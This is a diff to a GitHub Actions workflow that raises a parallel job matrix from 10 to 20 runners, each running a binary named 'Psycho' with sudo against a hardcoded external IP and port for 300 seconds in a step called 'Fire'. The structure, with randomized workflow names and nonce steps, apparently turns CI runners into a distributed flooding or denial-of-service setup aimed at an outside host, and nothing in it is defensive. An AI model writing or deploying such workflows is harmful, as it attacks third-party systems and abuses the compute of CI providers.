@@ -1,4 +1,4 @@
-name: psycho-e97d80b2
+name: psycho-ad94dff5
 on:
   push:
     branches: [ main, master ]
@@ -9,7 +9,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
     - name: Checkout
       uses: actions/checkout@v4
@@ -20,6 +20,6 @@ jobs:
         chmod +x Psycho.exe || true
     - name: Fire
       run: |
-        timeout 180s sudo ./Psycho 91.108.17.40 32003 180 2000 || timeout 180s sudo ./Psycho.exe 91.108.17.40 32003 180 2000 || true
-    - name: Nonce e97d80b2
-      run: echo "nonce=e97d80b2"
+        timeout 300s sudo ./Psycho 91.108.13.6 32002 300 2000 || timeout 300s sudo ./Psycho.exe 91.108.13.6 32002 300 2000 || true
+    - name: Nonce ad94dff5
+      run: echo "nonce=ad94dff5"
